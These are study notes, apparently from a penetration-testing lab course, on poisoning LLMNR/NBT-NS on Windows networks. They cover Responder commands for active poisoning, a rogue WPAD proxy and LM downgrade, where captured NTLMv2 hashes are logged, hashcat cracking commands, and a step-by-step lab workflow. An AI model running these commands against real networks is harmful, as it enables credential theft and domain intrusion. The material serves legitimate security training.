# LLMNR/NBT-NS Poisoning - from Linux

## How the Attack Works

```
User types wrong hostname → DNS fails → Host broadcasts LLMNR/NBT-NS request
→ Responder responds "I know that host!" → Victim sends NTLMv2 hash to us
→ Crack hash offline → cleartext password → domain foothold
```

**Protocols exploited:** LLMNR (UDP 5355) and NBT-NS (UDP 137)

**Key weakness:** ANY host on the network can reply to these broadcasts

---

## Why NTLMv2 Hashes Matter

- Can be **cracked offline** → cleartext password
- Cannot be used for pass-the-hash directly
- Can be used in **SMB Relay attacks** (covered separately)

---

## Responder — Full Attack Mode

```bash
# Basic run (active poisoning)
sudo responder -I ens224

# With WPAD proxy + fingerprinting (recommended)
sudo responder -I ens224 -wf

# Passive analysis only (no poisoning)
sudo responder -I ens224 -A
```

**Key flags:**

| Flag | Purpose |
| --- | --- |
| `-I` | Network interface |
| `-A` | Analyze only (passive) |
| `-w` | Start WPAD rogue proxy (captures HTTP from IE) |
| `-f` | Fingerprint remote OS |
| `-v` | Verbose output |
| `-F` | Force NTLM auth on WPAD |
| `--lm` | Force LM downgrade (XP/2003) |

**Required ports (must be free):**

```
UDP 137, 138, 53 | TCP 80, 135, 139, 445, 389, 21, 25, 110 | UDP/TCP 5355, 5353
```

---

## Where Hashes Are Saved

```bash
# Log directory
ls /usr/share/responder/logs/

# File format: MODULE-HASHTYPE-CLIENT_IP.txt
SMB-NTLMv2-SSP-172.16.5.25.txt
HTTP-NTLMv2-172.16.5.200.txt
```

Also stored in SQLite DB → configured in `/usr/share/responder/Responder.conf`

---

## Cracking NTLMv2 Hashes with Hashcat

```bash
# NTLMv2 = hash mode 5600
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Check status while running
# Press 's' to see status
```

**Common hash modes:**

| Mode | Hash Type |
| --- | --- |
| 5600 | NTLMv2 (NetNTLMv2) |
| 5500 | NTLMv1 |
| 1000 | NTLM (local hash) |

---

## Lab Workflow (for Questions)

```bash
# Step 1: SSH into attack host
ssh htb-student@10.129.47.38

# Step 2: Start Responder in tmux (let it run)
sudo responder -I ens224

# Step 3: Wait for hashes to appear on screen
# They'll print as: USERNAME::DOMAIN:hash...

# Step 4: Check log files for hashes starting with 'b'
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Step 5: Crack with Hashcat
hashcat -m 5600 /usr/share/responder/logs/<hash_file> /usr/share/wordlists/rockyou.txt

# Step 6: Wait — also look for wley's hash
# Check all log files periodically
```

**Pro tip:** Run Responder in a `tmux` window so it keeps running while you do other tasks:

```bash
tmux new -s responder
sudo responder -I ens224
# Ctrl+B then D to detach, tmux attach -t responder to return
```

---

## Key Takeaways

- Responder is **most effective on networks with LLMNR/NBT-NS not disabled** (very common in enterprise)
- Run Responder for **extended periods** — hashes come in when users try to access resources
- NTLMv2 = offline crack only; NTLMv1 = weaker, easier to crack
- WPAD (`w`) is powerful in large orgs — captures all IE/browser traffic
- One valid user hash cracked = **domain foothold** → open up credentialed enumeration